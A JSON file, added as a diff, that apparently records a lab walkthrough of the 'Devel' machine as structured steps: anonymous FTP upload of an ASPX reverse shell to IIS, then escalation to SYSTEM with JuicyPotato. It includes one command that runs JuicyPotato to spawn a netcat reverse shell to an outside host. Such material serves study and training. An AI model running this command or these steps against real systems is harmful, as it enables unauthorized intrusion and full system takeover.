@@ -1,0 +1,105 @@
+{
+  "artifacts": [
+    {
+      "draft_type": "case",
+      "artifact_type": "case",
+      "knowledge_role": "case_study",
+      "local_id": "case-devel",
+      "origin": "explicit",
+      "title": "FTP write to ASPX webshell and JuicyPotato SYSTEM (Devel)",
+      "starting_access": "unauthenticated access to FTP and IIS on a Windows 7 / Server 2008 R2",
+      "source_quality": "complete",
+      "difficulty": "easy",
+      "outcome": "NT AUTHORITY/SYSTEM via SeImpersonatePrivilege and JuicyPotato",
+      "transferable_properties": [
+        "FTP anonymous + IIS with web-root mapping gives instant webshell when write is allowed",
+        "check shell architecture before downloading tools, IIS app pools often run x86",
+        "IIS 7.5 maps to Windows 7/2008 R2 which maps to JuicyPotato",
+        "SeImpersonatePrivilege on IIS shells is by design",
+        "certutil is the most reliable download method on old Windows"
+      ],
+      "non_transferable_properties": [],
+      "steps": [
+        {
+          "artifact_type": "case_step",
+          "local_id": "step-1",
+          "ordinal": 1,
+          "state_before": {
+            "access": "unauthenticated",
+            "environment": ["FTP Microsoft ftpd", "IIS 7.5"],
+            "privileges": []
+          },
+          "observations": ["ports 21 and 80 open", "FTP anonymous login allowed", "FTP root maps to the IIS web root"],
+          "hypotheses": [{"statement": "FTP write access to the web root lets us upload an executable ASPX file", "origin": "inferred"}],
+          "selected_action": {"intent": "confirm FTP write access and enumerate the web root"},
+          "evidence": [{"summary": "confirmed FTP anonymous write access by uploading test.txt visible over HTTP", "origin": "explicit", "category": "recon"}],
+          "state_after": {
+            "access": "unauthenticated",
+            "environment": ["FTP write to web root"],
+            "privileges": []
+          },
+          "origin": "explicit",
+          "citations": [{"segment_indexes": [1, 2]}]
+        },
+        {
+          "artifact_type": "case_step",
+          "local_id": "step-2",
+          "ordinal": 2,
+          "state_before": {
+            "access": "unauthenticated",
+            "environment": ["FTP write to web root"],
+            "privileges": []
+          },
+          "observations": ["IIS serves ASP.NET, .aspx executes", "FTP can upload files"],
+          "hypotheses": [{"statement": "uploading an ASPX reverse shell and triggering it over HTTP yields a shell", "origin": "inferred"}],
+          "selected_action": {"intent": "generate an ASPX reverse shell, upload via FTP, and trigger via HTTP"},
+          "evidence": [{"summary": "uploaded shell.aspx and triggered it over HTTP for a shell as iis apppool/web", "origin": "explicit", "category": "exploitation"}],
+          "state_after": {
+            "access": "shell as iis apppool/web",
+            "environment": [],
+            "privileges": ["iis apppool/web"]
+          },
+          "origin": "explicit",
+          "citations": [{"segment_indexes": [2, 3]}]
+        },
+        {
+          "artifact_type": "case_step",
+          "local_id": "step-3",
+          "ordinal": 3,
+          "state_before": {
+            "access": "shell as iis apppool/web",
+            "environment": [],
+            "privileges": ["iis apppool/web"]
+          },
+          "observations": ["SeImpersonatePrivilege enabled", "Windows 7 / 2008 R2 x86", "x64 JuicyPotato failed architecture check"],
+          "hypotheses": [{"statement": "a x86 JuicyPotato abuses DCOM/BITS to impersonate SYSTEM", "origin": "inferred"}],
+          "selected_action": {"intent": "download the x86 JuicyPotato and nc.exe and run the token impersonation exploit"},
+          "evidence": [{"summary": "ran x86 JuicyPotato with the BITS CLSID and obtained NT AUTHORITY/SYSTEM", "origin": "explicit", "category": "privilege_escalation"}],
+          "state_after": {
+            "access": "NT AUTHORITY/SYSTEM",
+            "environment": [],
+            "privileges": ["SYSTEM"]
+          },
+          "origin": "explicit",
+          "citations": [{"segment_indexes": [4]}]
+        }
+      ],
+      "citations": [{"segment_indexes": [0, 1, 2, 3, 4]}]
+    }
+  ],
+  "execution_examples": [
+    {
+      "local_id": "ex-devel-1",
+      "parent_local_id": "step-3",
+      "command_template": "JuicyPotato.exe -l 1337 -p C:\\Windows\\Temp\\nc.exe -a \"-e cmd.exe 10.10.14.252 4434\" -t * -c {b6d9a9d5-9b6b-4d1a-a8f0-...}",
+      "placeholders": [],
+      "capability_hint": "privilege escalation via SeImpersonatePrivilege and JuicyPotato token impersonation",
+      "purpose": "escalate from an IIS app pool to NT AUTHORITY/SYSTEM via DCOM/BITS token impersonation",
+      "observed_role": "attacker shell as iis apppool/web",
+      "prerequisites": [{"statement": "the shell has SeImpersonatePrivilege and the JuicyPotato architecture matches", "citations": [{"segment_indexes": [4]}]}],
+      "platform_constraints": [{"dimension": "os_family", "relation": "required", "value": "windows", "citations": [{"segment_indexes": [4]}]}],
+      "citations": [{"segment_indexes": [4]}]
+    }
+  ],
+  "ignored_segment_indexes": [5, 6, 7]
+}
